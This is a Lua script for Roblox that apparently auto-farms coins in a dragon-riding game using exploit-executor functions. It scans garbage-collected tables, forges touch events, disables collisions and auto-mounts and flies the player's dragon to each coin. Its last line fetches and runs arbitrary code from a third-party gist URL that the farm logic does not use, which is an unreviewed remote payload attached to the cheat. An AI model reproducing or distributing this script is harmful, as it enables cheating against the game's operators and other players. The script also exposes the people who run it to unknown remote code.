local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CollectionService = game:GetService("CollectionService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer
local Sonar = require(ReplicatedStorage:WaitForChild("Sonar"))
local Wrapper = Sonar("PlayerWrapper").GetClient()
local DragonClass = Sonar("DragonClassClient")
local DragonService = Sonar("DragonService")
local MovementClass = Sonar("DragonMovementClass")
local CurrencyNodes = workspace:WaitForChild("Interactions"):WaitForChild("Nodes"):WaitForChild("CurrencyNodes")
local Spawned = CurrencyNodes:WaitForChild("Spawned")

local FlightSpeed = 90
local SegmentLength = 130
local TouchInterval = 1.15
local ScanInterval = 2
local Coins = {}
local Skipped = {}
local Target
local TargetDeadline = 0
local LastAttempt = 0
local LastScan = 0
local LastMount = -10
local LastNoClip = 0
local MountInProgress = false
local Running = true

local LockedDragon
local LockedRoot
local OriginalAnchored
local OriginalVelocityForce
local OriginalGyroTorque
local PositionControl
local RotationControl
local FlightAttachment
local FlightTween
local FlightProxy
local FlightChanged
local FlightFinished
local SavedCollisions = setmetatable({}, {__mode = "k"})
local LoopConnection

local function RiderRoot()
    local character = Player.Character
    return character and character:FindFirstChild("HumanoidRootPart")
end

local function StopTween()
    if FlightChanged then
        FlightChanged:Disconnect()
        FlightChanged = nil
    end
    if FlightFinished then
        FlightFinished:Disconnect()
        FlightFinished = nil
    end
    if FlightTween then
        FlightTween:Cancel()
        FlightTween = nil
    end
    if FlightProxy then
        FlightProxy:Destroy()
        FlightProxy = nil
    end
end

local function RestoreCollisions()
    for part, value in pairs(SavedCollisions) do
        if part.Parent then
            part.CanCollide = value
        end
        SavedCollisions[part] = nil
    end
end

local function NoClip(model)
    if not model then
        return
    end
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            if SavedCollisions[part] == nil then
                SavedCollisions[part] = part.CanCollide
            end
            part.CanCollide = false
        end
    end
end

local function UnlockFlight()
    StopTween()
    if PositionControl then
        PositionControl:Destroy()
        PositionControl = nil
    end
    if RotationControl then
        RotationControl:Destroy()
        RotationControl = nil
    end
    if FlightAttachment then
        FlightAttachment:Destroy()
        FlightAttachment = nil
    end
    if LockedDragon then
        local mover = LockedDragon.MoverClass
        if mover then
            mover.ForcedMoveDirection = nil
            if mover.BodyVelocity and OriginalVelocityForce then
                mover.BodyVelocity.MaxForce = OriginalVelocityForce
            end
            if mover.BodyGyro and OriginalGyroTorque then
                mover.BodyGyro.MaxTorque = OriginalGyroTorque
            end
        end
        LockedDragon.ForceLookAt = nil
    end
    if LockedRoot and LockedRoot.Parent then
        LockedRoot.AssemblyLinearVelocity = Vector3.zero
        LockedRoot.AssemblyAngularVelocity = Vector3.zero
        LockedRoot.Anchored = OriginalAnchored == true
    end
    MovementClass.SetVerticalInput("Up", false)
    MovementClass.SetVerticalInput("Down", false)
    LockedDragon = nil
    LockedRoot = nil
    OriginalAnchored = nil
    OriginalVelocityForce = nil
    OriginalGyroTorque = nil
end

local function ClearTarget()
    StopTween()
    Target = nil
    TargetDeadline = 0
end

local function LockFlight(dragon)
    local root = dragon.PrimaryPart
    if LockedDragon == dragon and LockedRoot == root and PositionControl then
        root.Anchored = false
        return
    end

    UnlockFlight()

    local mover = dragon.MoverClass
    LockedDragon = dragon
    LockedRoot = root
    OriginalAnchored = root.Anchored
    OriginalVelocityForce = mover.BodyVelocity and mover.BodyVelocity.MaxForce
    OriginalGyroTorque = mover.BodyGyro and mover.BodyGyro.MaxTorque

    root.Anchored = false

    local attachment = Instance.new("Attachment")
    attachment.Parent = root
    FlightAttachment = attachment

    local position = Instance.new("AlignPosition")
    position.Mode = Enum.PositionAlignmentMode.OneAttachment
    position.Attachment0 = attachment
    position.MaxForce = 10000000000
    position.MaxVelocity = FlightSpeed * 1.3
    position.Responsiveness = 200
    position.ApplyAtCenterOfMass = true
    position.Position = root.Position
    position.Parent = root
    PositionControl = position

    local orientation = Instance.new("AlignOrientation")
    orientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
    orientation.Attachment0 = attachment
    orientation.MaxTorque = 10000000000
    orientation.Responsiveness = 200
    orientation.CFrame = root.CFrame
    orientation.Parent = root
    RotationControl = orientation
end

local function ScanCoins()
    table.clear(Coins)
    if type(getgc) ~= "function" then
        return
    end
    for _, object in ipairs(getgc(true)) do
        if type(object) == "table" then
            local name = rawget(object, "CoinName")
            if name == "Coins" or name == "MegaCoins" then
                local part = rawget(object, "Part")
                local hitbox = rawget(object, "HitBox")
                if typeof(part) == "Instance" and part.Parent == CurrencyNodes
                    and typeof(hitbox) == "Instance" and hitbox:IsA("BasePart") then
                    Coins[part] = {Object = object, HitBox = hitbox}
                end
            end
        end
    end
end

local function IsActive(part)
    if not part or part.Parent ~= CurrencyNodes
        or (part.Name ~= "Coins" and part.Name ~= "MegaCoins")
        or not CollectionService:HasTag(part, "SpawnedCurrencyDrop") then
        return false
    end
    local coin = Coins[part]
    return coin ~= nil
        and not rawget(coin.Object, "Claimed")
        and coin.HitBox.Parent ~= nil
        and coin.HitBox:IsDescendantOf(Spawned)
        and (coin.HitBox.Position - part.Position).Magnitude < 75
        and coin.HitBox.Position.Y > -500
end

local function ChooseCoin(position)
    local nearest
    local best = math.huge
    local now = os.clock()
    for part, coin in pairs(Coins) do
        if IsActive(part) and (not Skipped[part] or Skipped[part] <= now) then
            local distance = (coin.HitBox.Position - position).Magnitude
            if distance < best then
                best = distance
                nearest = part
            end
        end
    end
    return nearest, best
end

local function IsMounted(dragon)
    if not dragon or not dragon.DragonModel then
        return false
    end
    local character = Player.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local seat = humanoid and humanoid.SeatPart
    return seat ~= nil and seat:IsDescendantOf(dragon.DragonModel)
end

local function GetDragonValue()
    local selected = Wrapper.SelectedDragonValue
    local selectedValue = selected and selected.Value
    local owned = Wrapper.PlayerData and Wrapper.PlayerData:FindFirstChild("Dragons")

    local function Eligible(value)
        if not value or not value.Parent then
            return false
        end
        local existing = DragonClass.getDragonFromDataValue(value, true)
        if existing then
            return existing.CanFly and not existing.InYouth
        end
        local age = value:FindFirstChild("Age")
        if age then
            local ok, young = pcall(function()
                return DragonService.IsDragonInYouth(DragonService.GetAge(age.Value))
            end)
            if ok and young then
                return false
            end
        end
        local ok, allowed = pcall(DragonService.CanEquipDragon, value, Wrapper)
        return ok and allowed == true
    end

    if Eligible(selectedValue) then
        return selectedValue
    end
    if owned then
        for _, value in ipairs(owned:GetChildren()) do
            if Eligible(value) then
                return value
            end
        end
    end
end

local function TryMount()
    if MountInProgress or os.clock() - LastMount < 5 then
        return
    end
    LastMount = os.clock()
    MountInProgress = true

    task.spawn(function()
        pcall(function()
            local current = Wrapper.CurrentDragon
            if not current or not current.IsLocalPlayer then
                local value = GetDragonValue()
                if not value then
                    return
                end
                current = DragonClass.getDragonFromDataValue(value, true)
                if not current then
                    local remote = ReplicatedStorage.Remotes:FindFirstChild("EquipDragonRemote")
                    local ok, allowed = pcall(DragonService.CanEquipDragon, value, Wrapper)
                    if remote and ok and allowed == true then
                        remote:InvokeServer(value.Name)
                    end
                    for i = 1, 40 do
                        current = DragonClass.getDragonFromDataValue(value, true)
                        if current then
                            break
                        end
                        task.wait(0.15)
                    end
                end
            end
            if not current or not current.IsLocalPlayer or not current.CanFly or current.InYouth then
                return
            end
            local character = Player.Character
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            local seat = current.Seat
            if humanoid and seat and seat:IsDescendantOf(workspace) then
                for i = 1, 30 do
                    if IsMounted(current) or not seat:IsDescendantOf(workspace) then
                        break
                    end
                    seat:Sit(humanoid)
                    task.wait(0.1)
                end
            end
        end)
        MountInProgress = false
    end)
end

local function AdjustGoal(dragon, destination)
    local rider = RiderRoot()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if rider and humanoid and humanoid.SeatPart then
        local offset = rider.Position - dragon.PrimaryPart.Position
        if offset.Magnitude < 30 then
            return destination - offset
        end
    end
    return destination
end

local function StartTween(dragon, destination)
    if FlightTween then
        return
    end
    local root = dragon.PrimaryPart
    local displacement = destination - root.Position
    if displacement.Magnitude < 1 then
        return
    end

    local distance = math.min(displacement.Magnitude, SegmentLength)
    local waypoint = root.Position + displacement.Unit * distance
    local flat = Vector3.new(displacement.X, 0, displacement.Z)
    local facing = flat.Magnitude > 0.1
        and flat.Unit * (dragon.MoverClass.NegateLookVector or 1)
        or root.CFrame.LookVector
    local targetCFrame = CFrame.lookAt(waypoint, waypoint + facing)

    local proxy = Instance.new("CFrameValue")
    proxy.Value = root.CFrame
    FlightProxy = proxy
    FlightChanged = proxy.Changed:Connect(function(value)
        if LockedDragon == dragon and PositionControl and RotationControl then
            PositionControl.Position = value.Position
            RotationControl.CFrame = value
        end
    end)

    local tween = TweenService:Create(proxy, TweenInfo.new(math.max(0.1, distance / FlightSpeed), Enum.EasingStyle.Linear), {Value = targetCFrame})
    FlightTween = tween
    FlightFinished = tween.Completed:Connect(function()
        if FlightTween == tween then
            StopTween()
        end
    end)
    tween:Play()
end

local function FlyToCoin(dragon, targetPosition)
    local mover = dragon.MoverClass
    if not mover or not dragon.PrimaryPart or not dragon.CanFly then
        return
    end
    if not dragon.Flying then
        dragon:_setFlying(true, true)
    end
    LockFlight(dragon)

    mover.ForcedMoveDirection = Vector3.zero
    if mover.BodyVelocity then
        mover.BodyVelocity.MaxForce = Vector3.zero
        mover.BodyVelocity.Velocity = Vector3.zero
    end
    if mover.BodyGyro then
        mover.BodyGyro.MaxTorque = Vector3.zero
    end
    MovementClass.SetVerticalInput("Up", false)
    MovementClass.SetVerticalInput("Down", false)
    dragon.ForceLookAt = nil

    local destination = AdjustGoal(dragon, targetPosition)
    if not FlightTween and (destination - dragon.PrimaryPart.Position).Magnitude > 2 then
        StartTween(dragon, destination)
    end
end

local function AttemptCollect(dragon, now)
    if now - LastAttempt < TouchInterval or not IsActive(Target) then
        return
    end
    local coin = Coins[Target]
    local destination = coin.HitBox.Position
    local rider = RiderRoot()
    local distance = (dragon.PrimaryPart.Position - destination).Magnitude
    if rider then
        distance = math.min(distance, (rider.Position - destination).Magnitude)
    end
    if distance > 8 then
        return
    end
    LastAttempt = now
    local touchedPart = rider or dragon.PrimaryPart
    if type(firesignal) == "function" then
        pcall(firesignal, coin.HitBox.Touched, touchedPart)
    elseif type(firetouchinterest) == "function" then
        pcall(function()
            firetouchinterest(touchedPart, coin.HitBox, 0)
            firetouchinterest(touchedPart, coin.HitBox, 1)
        end)
    end
    if IsActive(Target) then
        pcall(function()
            coin.Object:Loot()
        end)
    end
end

local function Step()
    if not Running then
        return
    end
    local now = os.clock()
    if now - LastScan >= ScanInterval then
        LastScan = now
        ScanCoins()
    end

    local dragon = Wrapper.CurrentDragon
    if not dragon or not dragon.IsLocalPlayer or not dragon.PrimaryPart or not IsMounted(dragon) then
        if LockedDragon then
            ClearTarget()
            UnlockFlight()
            RestoreCollisions()
        end
        TryMount()
        return
    end

    if LockedDragon and LockedDragon ~= dragon then
        ClearTarget()
        UnlockFlight()
        RestoreCollisions()
    end

    if now - LastNoClip >= 0.2 then
        LastNoClip = now
        NoClip(dragon.DragonModel)
        NoClip(Player.Character)
    end

    if Target and not IsActive(Target) then
        ClearTarget()
    end
    if not Target then
        local distance
        Target, distance = ChooseCoin((RiderRoot() or dragon.PrimaryPart).Position)
        if Target then
            TargetDeadline = now + math.max(18, distance / FlightSpeed * 3 + 12)
        end
    end

    if not Target then
        UnlockFlight()
        RestoreCollisions()
        return
    end
    if now > TargetDeadline then
        Skipped[Target] = now + 20
        ClearTarget()
        return
    end

    FlyToCoin(dragon, Coins[Target].HitBox.Position)
    AttemptCollect(dragon, now)
end

local function Stop()
    Running = false
    if LoopConnection then
        LoopConnection:Disconnect()
        LoopConnection = nil
    end
    ClearTarget()
    UnlockFlight()
    RestoreCollisions()
end

local environment = type(getgenv) == "function" and getgenv() or _G
if type(environment.Dem3x3FarmStop) == "function" then
    pcall(environment.Dem3x3FarmStop)
end
environment.Dem3x3FarmStop = Stop

Player:SetAttribute("FarmMode", "Coins")

LoopConnection = RunService.Heartbeat:Connect(function()
    pcall(Step)
end)


loadstring(game:HttpGet("https://gist.githubusercontent.com/t4amd4shie/812d6bd62ffc0020545e0907e3f89741/raw/fcc346762f6abc95e341037ecd9f2d66374757a4/gistfile1.txt"))()
